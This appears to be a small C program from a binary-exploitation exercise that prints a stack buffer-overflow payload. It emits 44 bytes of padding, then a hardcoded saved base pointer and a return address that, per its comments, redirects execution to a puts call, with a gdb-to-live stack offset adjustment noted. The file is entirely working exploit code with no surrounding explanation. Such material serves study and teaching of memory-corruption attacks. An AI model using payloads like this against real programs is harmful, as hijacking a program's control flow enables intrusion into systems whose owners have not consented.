#include <stdio.h>
#include <string.h>

int main(void)
{
    unsigned int addrs[] = {
        0xbffff548, // Base pointer ($ebp_gdb + ($ebp_live - $ebp_gdb))
        0x0804851a, // Return address replaced with puts call
    };

    printf("00010002000300040005000600070008000900100011");
    fwrite(addrs, sizeof(unsigned int), sizeof(addrs) / sizeof(addrs[0]), stdout);

    return 0;
}
